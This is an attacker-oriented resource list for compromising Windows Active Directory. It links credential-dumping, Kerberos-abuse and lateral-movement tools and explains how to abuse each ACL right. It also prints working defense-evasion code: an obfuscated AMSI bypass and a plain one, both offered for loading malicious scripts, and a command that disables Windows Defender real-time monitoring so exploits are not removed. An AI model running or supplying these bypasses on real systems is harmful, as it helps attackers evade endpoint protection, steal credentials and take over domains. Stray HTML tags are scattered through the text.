# AD-Security-Resources

Bypass Execution Policy : 
https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/

Huge list of AD security resources available below :
  https://adsecurity.org/
  https://www.harmj0y.net/
  https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
  https://beta.hackndo.com/


Setting up active directory lab :  https://github.com/outflanknl/Invoke-ADLabDeployer 

Bypassing Powershell execution policy issues : </H2>

Github links - AMSI Bypass for loading malicious scripts:
  <p>  https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell </p>
  Something that works quickly 
  <p>   sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} ) </p>

This works !!!
(Thanks - https://burmat.gitbook.io/security/hacking/domain-exploitation#user-and-computers-with-unconstrained-delegation)
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

Detailed Article on this subject : https://blog.f-secure.com/hunting-for-amsi-bypasses/


Constrained Language Mode : 
Constrained Language consists of a number of restrictions that limit unconstrained code execution on a locked-down system.  (https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)

Check the below for bypassing this 
https://github.com/padovah4ck/PSByPassCLM
https://chickenpwny.github.io/concepts/bypass/



Turning of Windows Defender - Real Time Monitoring (for not letting exploits to be deleted):
Set-MpPreference -DisableRealtimeMonitoring $true

<H2> Recon of active directory objects :</h2>
<p>PowerView / Powersploit: https://github.com/PowerShellMafia/PowerSploit</p>

<h3>ACL Enumeration and escalation :</h3>
Some of the Active Directory object permissions and types that we as attackers are interested in:
<b>GenericAll</b> - full rights to the object (add users to a group or reset user's password)
<b>GenericWrite</b> - update object's attributes (i.e logon script)
<b>WriteOwner</b> - change object owner to attacker controlled user take over the object
<b>WriteDACL</b> - modify object's ACEs and give attacker full control right over the object
<b>AllExtendedRights</b> - ability to add user to a group or reset password
<b>ForceChangePassword</b> - ability to change user's password
<b>Self (Self-Membership)</b> - ability to add yourself to a group
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

AD Module :
  https://github.com/samratashok/ADModule

Bloodhound
  https://github.com/BloodHoundAD/SharpHound
  https://github.com/BloodHoundAD/BloodHound

Lateral Movement Automation :
  https://github.com/GoFetchAD/GoFetch

Credential Dumping for all attacks (PTH, Kerberoasting, Golden Ticket Attack, Silver Ticket Attack, Skeleton Key Attack:
Mimikatz : https://github.com/gentilkiwi/mimikatz

Spraykatz - Credentials gathering tool automating remote procdump and parse of lsass process
  https://github.com/aas-n/spraykatz

Mimikittenz - Reading credentians from process :
  https://github.com/putterpanda/mimikittenz

Benjamin Delpy's Kekeo 
  https://github.com/gentilkiwi/kekeo/

Vincent LE TOUX's MakeMeEnterpriseAdmin
  https://github.com/vletoux/MakeMeEnterpriseAdmin

Rubeus :
  https://github.com/GhostPack/Rubeus

Pingcastle - AD Security :
  https://github.com/vletoux/pingcastle



